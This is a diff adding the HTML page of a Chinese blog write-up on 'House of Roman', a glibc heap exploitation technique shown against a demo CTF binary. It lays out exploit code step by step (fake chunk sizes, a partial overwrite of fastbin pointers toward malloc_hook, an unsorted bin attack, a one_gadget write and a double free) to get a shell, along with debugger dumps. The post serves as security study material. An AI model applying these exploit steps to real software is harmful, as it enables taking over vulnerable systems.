@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="暴力bypass alsr的一个方法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="House of Roman">
+<meta property="og:url" content="https://bestwing.me/house_of_roman.html">
+<meta property="og:site_name" content="Swing&#39;Blog 有恨无人省">
+<meta property="og:description" content="暴力bypass alsr的一个方法">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2018-06-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-10-28T13:33:16.000Z">
+<meta property="article:author" content="Swing">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>House of Roman</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 有恨无人省" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018-t3sec-Northwest-Division.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/thread-local-caching-in-glibc-malloc.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/house_of_roman.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/house_of_roman.html&text=House of Roman"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/house_of_roman.html&title=House of Roman"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/house_of_roman.html&is_video=false&description=House of Roman"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=House of Roman&body=Check out this article: https://bestwing.me/house_of_roman.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/house_of_roman.html&title=House of Roman"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/house_of_roman.html&title=House of Roman"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/house_of_roman.html&title=House of Roman"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/house_of_roman.html&title=House of Roman"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/house_of_roman.html&name=House of Roman&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/house_of_roman.html&t=House of Roman"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#House-of-Roman"><span class="toc-number">1.</span> <span class="toc-text">House of Roman</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E6%8B%AC"><span class="toc-number">1.2.</span> <span class="toc-text">概括</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E5%B1%95%E7%A4%BA"><span class="toc-number">1.3.</span> <span class="toc-text">原理以及展示</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text">第一步</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">第二步</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5"><span class="toc-number">1.3.3.</span> <span class="toc-text">第三步</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90-exp"><span class="toc-number">1.4.</span> <span class="toc-text">分析 exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#link"><span class="toc-number">1.5.</span> <span class="toc-text">link</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        House of Roman
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Swing'Blog 有恨无人省</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-06-01T16:00:00.000Z" itemprop="datePublished">2018-06-02</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Writeup/">Writeup</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/heap/" rel="tag">heap</a>, <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>House of Roman 这个技巧说简单点其实就是 fastbin attack 和 Unsortbin attachk 结合的一个小 trick。</p>
+<h2 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h2><p>该技术用于 bypass ALSR，利用12-bit 的爆破来达到获取shell的目的。且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用。</p>
+<h2 id="原理以及展示"><a href="#原理以及展示" class="headerlink" title="原理以及展示"></a>原理以及展示</h2><p>作者提供给了我们一个 demo 用于展示，整个利用过程大概可以分为三步骤。</p>
+<ol>
+<li>将 FD 指向 malloc_hook</li>
+<li>修正 0x71 的 Freelist</li>
+<li>往 malloc_hook 写入 one gadget</li>
+</ol>
+<p>先对 demo 进行一个大致的分析：</p>
+<p>开启的保护情况：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/media/psf/Home/Desktop/MyCTF/House-Of-Roman/new_chall&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>样题中有三个主要功能，Malloc ，Write，以及 Free。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( v4 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Malloc&quot;</span>);</span><br><span class="line">    v5 = malloc_chunk(<span class="string">&quot;Malloc&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Write&quot;</span>);</span><br><span class="line">    write_chunk(<span class="string">&quot;Write&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Free&quot;</span>);</span><br><span class="line">    free_chunk();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p>在 Free 功能中存在 指针未置零而造成的悬挂指针。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_chunk</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nEnter index :&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v0);</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0x13</span> )</span><br><span class="line">    <span class="built_in">free</span>(heap_ptrs[(<span class="keyword">unsigned</span> __int64)v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>首先伪造一个 chunk  ，chunk的大小为0x61。紧接着我们利用 partial overwrite 将 FD 指向伪造的chunk（当然，这里我们也可以用 UAF 完成）。</p>
+<p>伪造 chunk size</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;</span><br><span class="line">0x555555757050: 0x41414141      0x41414141      0x41414141      0x41414141</span><br><span class="line">0x555555757060: 0x41414141      0x41414141      0x41414141      0x41414141</span><br><span class="line">0x555555757070: 0x41414141      0x41414141      0x41414141      0x41414141</span><br><span class="line">0x555555757080: 0x41414141      0x41414141      0x41414141      0x41414141</span><br><span class="line">0x555555757090: 0x41414141      0x41414141      0x61    0x0     &lt;----------</span><br></pre></td></tr></table></figure>
+
+<p>这里，我们 free 掉 chunk 1，这个时候我们能获得一个 unsortbin</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x555555757020 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0x0,</span><br><span class="line">  size &#x3D; 0xd1,</span><br><span class="line">  fd &#x3D; 0x7ffff7dd1b58 &lt;main_arena+88&gt;,</span><br><span class="line">  bk &#x3D; 0x7ffff7dd1b58 &lt;main_arena+88&gt;,</span><br><span class="line">  fd_nextsize &#x3D; 0x4141414141414141,</span><br><span class="line">  bk_nextsize &#x3D; 0x4141414141414141</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着，我们重分配 0xd1 这块 chunk，以及修改其 size 为0x71</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;40ag 0x555555757020</span><br><span class="line">0x555555757020: 0x4141414141414141      0x71</span><br><span class="line">0x555555757030: 0x7ffff7dd1b58 &lt;main_arena+88&gt;  0x7ffff7dd1b58 &lt;main_arena+88&gt;</span><br><span class="line">0x555555757040: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757050: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757060: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757070: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757080: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757090: 0x4141414141414141      0x61</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们紧接着需要修正这0x71 FD freelist ，将其伪造成已经释放的块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;40ag 0x555555757000</span><br><span class="line">0x555555757000: 0x0     0x21</span><br><span class="line">0x555555757010: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757020: 0x4141414141414141      0x71       &lt;----------  free 0x71</span><br><span class="line">0x555555757030: 0x7ffff7dd1b58 &lt;main_arena+88&gt;  0x7ffff7dd1b58 &lt;main_arena+88&gt;</span><br><span class="line">0x555555757040: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757050: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757060: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757070: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757080: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555757090: 0x4141414141414141      0x61</span><br><span class="line">0x5555557570a0: 0x0     0x0</span><br><span class="line">0x5555557570b0: 0x0     0x0</span><br><span class="line">0x5555557570c0: 0x0     0x0</span><br><span class="line">0x5555557570d0: 0x0     0x0</span><br><span class="line">0x5555557570e0: 0x0     0x0</span><br><span class="line">0x5555557570f0: 0xd0    0x71   &lt;----------     free 0x71</span><br><span class="line">0x555555757100: 0x0     0x0</span><br><span class="line">0x555555757110: 0x0     0x0</span><br><span class="line">0x555555757120: 0x0     0x0</span><br><span class="line">0x555555757130: 0x0     0x0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc : 0x7ffff7a23d28 (&quot;malloc_hook&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>这个时候我们的 FD 已经在 malloc hook 附近，未之后的爆破做准备。</p>
+<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>我们只需要通过 释放一块0x71大小的 chunk 就能完成 fix。</p>
+<h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p>利用 unsortebin 的攻击技巧，并使用编辑功能将 onegadet 写入    。</p>
+<h2 id="分析-exp"><a href="#分析-exp" class="headerlink" title="分析 exp"></a>分析 exp</h2><p>分配 <code>3</code> 个 <code>chunk</code> ，在 <code>B + 0x78</code> 处设置 <code>p64(0x61)</code> ， 作用是 <code>fake size</code> ,用于后面 的 <code>fastbin attack</code></p>
+<p></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="number">0</span>) <span class="comment"># 0x20</span></span><br><span class="line">create(<span class="number">0xc8</span>,<span class="number">1</span>) <span class="comment"># d0</span></span><br><span class="line">create(<span class="number">0x65</span>,<span class="number">2</span>)  <span class="comment"># 0x70</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;create 2 chunk, 0x20, 0xd8&quot;</span>)</span><br><span class="line">fake = <span class="string">&quot;A&quot;</span>*<span class="number">0x68</span></span><br><span class="line">fake += p64(<span class="number">0x61</span>)  <span class="comment">## fake size</span></span><br><span class="line">edit(<span class="number">1</span>,fake)</span><br><span class="line">info(<span class="string">&quot;fake&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>释放掉 <code>B</code> , 然后分配同样大小再次分配到 <code>B</code> , 此时 <code>B+0x10</code> 和 <code>B+0x18</code> 中有 <code>main_arean</code> 的地址。分配 <code>3</code> 个 <code>fastbin</code> ，利用 <code>off by one</code> 修改 <code>B-&gt;size = 0x71</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">free(1)</span><br><span class="line">create(0xc8,1)</span><br><span class="line"></span><br><span class="line">create(0x65,3)  # b</span><br><span class="line">create(0x65,15)</span><br><span class="line">create(0x65,18)</span><br><span class="line"></span><br><span class="line">over &#x3D; &quot;A&quot;*0x18  # off by one</span><br><span class="line">over +&#x3D; &quot;\x71&quot;  # set chunk  1&#39;s size --&gt; 0x71</span><br><span class="line">edit(0,over)</span><br><span class="line">info(&quot;利用 off by one ,  chunk  1&#39;s size --&gt; 0x71&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>生成两个 <code>fastbin</code> ，然后利用 <code>uaf</code> ，部分地址写，把 <code>B</code> 链入到 <code>fastbin</code></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">info(<span class="string">&quot;创建两个 0x70 的 fastbin&quot;</span>)</span><br><span class="line">heap_po = <span class="string">&quot;\x20&quot;</span></span><br><span class="line">edit(<span class="number">3</span>,heap_po)</span><br><span class="line">info(<span class="string">&quot;把 chunk&#x27;1 链入到 fastbin 里面&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>调试看看此时 <code>fastbin</code> 的状态</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x555555757160 —▸ 0x555555757020 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x7ffff7dd1b78</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>0x555555757020</code> 就是 <code>chunk B</code></p>
+</blockquote>
+<p> 然后通过修改 <code>B-&gt;fd</code> 的低 <code>2</code> 字节， 使得 <code>B-&gt;fd= malloc_hook - 0x23</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># malloc_hook 上方</span><br><span class="line">malloc_hook_nearly &#x3D; &quot;\xed\x1a&quot;</span><br><span class="line">edit(1,malloc_hook_nearly)</span><br><span class="line">info(&quot;部分写，修改 fastbin-&gt;fd ---&gt; malloc_hook&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后分配 <code>3</code> 个 <code>0x70</code> 的 <code>chunk</code> ，就可以拿到 <code>malloc_hook</code> 所在的那个 <code>chunk</code> .</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create(0x65,0)</span><br><span class="line">create(0x65,0)</span><br><span class="line">create(0x65,0)</span><br></pre></td></tr></table></figure>
+
+<p>然后 <code>free</code> 掉 <code>E</code> ，进入 <code>fastbin</code> ，利用 <code>uaf</code> 设置 <code>E-&gt;fd = 0</code> ， 修复了 <code>fastbin</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(15)</span><br><span class="line">edit(15,p64(0x00))</span><br><span class="line">info(&quot;再次生成 0x71 的 fastbin, 同时修改 fd &#x3D;0, 修复 fastbin&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>然后是 unsorted bin 攻击，使得 malloc_hook 的值为 main_arena+88</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">create(0xc8,1)</span><br><span class="line">create(0xc8,1)</span><br><span class="line">create(0x18,2)</span><br><span class="line">create(0xc8,3)</span><br><span class="line">create(0xc8,4)</span><br><span class="line">free(1)</span><br><span class="line">po &#x3D; &quot;B&quot;*8</span><br><span class="line">po +&#x3D; &quot;\x00\x1b&quot;</span><br><span class="line">edit(1,po)</span><br><span class="line">create(0xc8,1)</span><br><span class="line">info(&quot;unsorted bin 使得 malloc_hook 有 libc 的地址&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>利用 修改 <code>malloc_hook</code> 的低三个字节 ，使得 <code>malloc_hook</code> 为 <code>one_gadget</code> 的地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">over &#x3D; &quot;R&quot;*0x13   # padding for malloc_hook</span><br><span class="line">over +&#x3D; &quot;\xa4\xd2\xaf&quot;</span><br><span class="line">edit(0,over)</span><br><span class="line"></span><br><span class="line">info(&quot;malloc_hook to one_gadget&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>然后 <code>free</code>  两次同一个  <code>chunk</code>  ，触发  <code>malloc_printerr</code>  ， <code>getshell</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(18)</span><br><span class="line">free(18)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="link"><a href="#link" class="headerlink" title="link"></a>link</h2><p><a href="https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc">https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc</a></p>
+<p><a href="https://github.com/romanking98/House-Of-Roman">https://github.com/romanking98/House-Of-Roman</a></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#House-of-Roman"><span class="toc-number">1.</span> <span class="toc-text">House of Roman</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E6%8B%AC"><span class="toc-number">1.2.</span> <span class="toc-text">概括</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E5%B1%95%E7%A4%BA"><span class="toc-number">1.3.</span> <span class="toc-text">原理以及展示</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5"><span class="toc-number">1.3.1.</span> <span class="toc-text">第一步</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5"><span class="toc-number">1.3.2.</span> <span class="toc-text">第二步</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5"><span class="toc-number">1.3.3.</span> <span class="toc-text">第三步</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90-exp"><span class="toc-number">1.4.</span> <span class="toc-text">分析 exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#link"><span class="toc-number">1.5.</span> <span class="toc-text">link</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/house_of_roman.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/house_of_roman.html&text=House of Roman"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/house_of_roman.html&title=House of Roman"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/house_of_roman.html&is_video=false&description=House of Roman"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
